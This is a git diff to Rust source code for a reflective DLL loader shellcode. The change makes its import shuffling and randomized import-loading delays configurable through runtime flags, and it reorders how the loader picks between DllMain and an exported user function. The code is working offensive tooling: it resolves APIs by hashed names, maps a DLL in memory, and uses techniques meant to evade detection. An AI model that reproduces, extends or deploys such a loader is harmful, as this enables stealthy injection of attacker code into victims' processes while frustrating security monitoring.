@@ -10,6 +10,7 @@ use core::{
     slice::from_raw_parts,
 };
 
+use airborne_utils::Flags;
 use windows_sys::{
     core::PWSTR,
     Win32::{
@@ -41,10 +42,6 @@ use windows_sys::{
 
 use crate::memory::*;
 
-// TODO: replace with parameters from the shellcode generator
-const SHUFFLE_IMPORTS: bool = true;
-const DELAY_IMPORTS: bool = true;
-
 const MAX_IMPORT_DELAY_MS: u64 = 2000;
 
 #[cfg(not(test))]
@@ -70,6 +67,8 @@ pub unsafe extern "system" fn loader(
     _shellcode_bin: *mut c_void,
     flags: u32,
 ) {
+    let flags = airborne_utils::parse_u32_flag(flags);
+
     /*
         1.) locate the required functions and modules from exports with their hashed names
     */
@@ -139,7 +138,7 @@ pub unsafe extern "system" fn loader(
         return;
     }
 
-    patch_iat(base_addr_ptr, import_descriptor_ptr, &far_procs);
+    patch_iat(base_addr_ptr, import_descriptor_ptr, &far_procs, &flags);
 
     /*
         5.) finalize the sections by setting protective permissions after mapping the image
@@ -151,15 +150,7 @@ pub unsafe extern "system" fn loader(
         6.) execute DllMain or user defined function depending on the flag passed into the shellcode by the generator
     */
 
-    if flags == 0 {
-        let dll_main_addr = base_addr_ptr as usize
-            + (*module_nt_headers_ptr).OptionalHeader.AddressOfEntryPoint as usize;
-
-        #[allow(non_snake_case)]
-        let DllMain = transmute::<_, DllMain>(dll_main_addr);
-
-        DllMain(base_addr_ptr as _, DLL_PROCESS_ATTACH, module_base_ptr as _);
-    } else {
+    if flags.ufn {
         // UserFunction address = base address + RVA of user function
         let user_fn_addr = get_export_addr(base_addr_ptr as _, function_hash).unwrap();
 
@@ -168,6 +159,14 @@ pub unsafe extern "system" fn loader(
 
         // execution with user data passed into the shellcode by the generator
         UserFunction(user_data, user_data_len);
+    } else {
+        let dll_main_addr = base_addr_ptr as usize
+            + (*module_nt_headers_ptr).OptionalHeader.AddressOfEntryPoint as usize;
+
+        #[allow(non_snake_case)]
+        let DllMain = transmute::<_, DllMain>(dll_main_addr);
+
+        DllMain(base_addr_ptr as _, DLL_PROCESS_ATTACH, module_base_ptr as _);
     }
 }
 
@@ -418,6 +417,7 @@ unsafe fn patch_iat(
     base_addr_ptr: *mut c_void,
     mut import_descriptor_ptr: *mut IMAGE_IMPORT_DESCRIPTOR,
     far_procs: &FarProcs,
+    flags: &Flags,
 ) -> BOOL {
     /*
         1.) shuffle Import Directory Table entries (image import descriptors)
@@ -436,7 +436,7 @@ unsafe fn patch_iat(
 
     let id_ptr = import_descriptor_ptr;
 
-    if import_count > 1 && SHUFFLE_IMPORTS {
+    if import_count > 1 && flags.shuffle {
         // Fisher-Yates shuffle
         for i in 0..import_count - 1 {
             let rn = match get_random(far_procs) {
@@ -465,7 +465,7 @@ unsafe fn patch_iat(
             return 0;
         }
 
-        if DELAY_IMPORTS {
+        if flags.delay {
             // skip delay if winapi call fails
             let rn = get_random(far_procs).unwrap_or(0);
             let delay = rn % MAX_IMPORT_DELAY_MS;
